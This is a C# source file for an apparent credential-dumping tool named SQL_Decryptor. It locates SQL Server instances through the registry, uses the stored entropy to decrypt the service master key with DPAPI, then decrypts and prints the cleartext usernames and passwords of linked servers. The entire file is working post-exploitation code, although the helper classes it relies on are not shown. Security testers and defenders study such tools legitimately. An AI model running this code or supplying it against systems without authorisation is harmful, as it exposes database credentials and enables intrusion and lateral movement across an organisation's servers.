using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;

namespace SQL_Decryptor
{
    class Decryptor
    {
        private Database        _Database;
        private Registry        _Registry;
        private Cryptography    _Cryptography;
        public Decryptor()
        {
            _Registry       = new Registry();
            _Cryptography   = new Cryptography();
        }

        public byte[] GetServiceKey()
        {
            return (byte[]) _Database.Select(Constants.SQL_SERVICE_KEY);
        }

        private byte[] GetEntropy(string Path, string Key)
        {
            return _Registry.GetValue<byte[]>(Microsoft.Win32.Registry.LocalMachine, Path, Key);
        }

        private DataTable GetPasswords(int IV)
        {
            string Query = String.Format(Constants.SQL_ENCRYPTED_PASSWORDS, IV, IV + 5, IV + 4);

            return _Database.Select_DataTable(Query);
        }

        private string[] GetInstances()
        {
            return _Registry.GetValue<string[]>(Microsoft.Win32.Registry.LocalMachine, Constants.Registry_Instances, "InstalledInstances");
        }
        public void DecryptPasswords()
        {
            Console.WriteLine("[*] Getting SQL Instances");

            string[] Instances = GetInstances();

            if (Instances == null)
            {
                Console.WriteLine("\t [-] No SQL Instances Found");
                Console.ReadLine();
                return;
            }

            Console.WriteLine(String.Format("\t [+] Got {0} Instances\r\n", Instances.Length));

            foreach (string Instance in Instances)
            {
                string ConnectionString = String.Format(Constants.SQL_INSTANCE, Instance == "MSSQLSERVER" ? "" : Instance);
                _Database = new Database(ConnectionString);

                string InstanceName = _Registry.GetValue<string>(Microsoft.Win32.Registry.LocalMachine, @"SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\sql\", Instance);

                Console.WriteLine("[*] Getting Encryption Entropy");

                byte[] Entropy = GetEntropy(String.Format(Constants.Registry_Entropy, InstanceName), "Entropy");

                Console.WriteLine("\t [+] {0} Byte Entropy obtained\r\n", Entropy.Length);

                Console.WriteLine("[*] Decrypting MSSQL Service Key");

                byte[] ServiceKey = _Cryptography.Unprotect(GetServiceKey(), Entropy, System.Security.Cryptography.DataProtectionScope.LocalMachine);

                if (ServiceKey == null)
                {
                    Console.WriteLine("\t [-] Could not derypt Service Key!");
                    Console.ReadLine();
                    return;
                } else
                {
                    Console.WriteLine("\t [+] Service key Decrypted!");
                }

                DataTable DT = GetPasswords(ServiceKey.Length == 16 ? 8 : 16);

                foreach (DataRow Login in DT.Rows)
                {
                    string Server = Login.Field<string>("Server");
                    string Username = Login.Field<string>("Username");
                    byte[] IV = Login.Field<byte[]>("IV");
                    byte[] Hash = Login.Field<byte[]>("Hash");
                    bool isAES = false;

                    string Decrypted = "";

                    if (ServiceKey.Length == 16)
                        Decrypted = _Cryptography.DecryptDES(Hash, ServiceKey, IV);
                    else
                    {
                        Decrypted = _Cryptography.DecryptAES(Login.Field<byte[]>("Hash"), ServiceKey, Login.Field<byte[]>("IV"));
                        isAES = true;
                    }

                    Console.WriteLine(Constants.SEPERATOR);

                    Console.WriteLine("[*] Server Name: {0}", Server);
                    Console.WriteLine("\t [+] Username: {0}", Username);
                    Console.WriteLine("\t [+] Password: {0}", Decrypted.Remove(0, 6));
                    Console.WriteLine("\t [+] Encryption: {0}", isAES ? "AES" : "DES");

                }
            }

            Console.ReadLine();
        }

    }
}
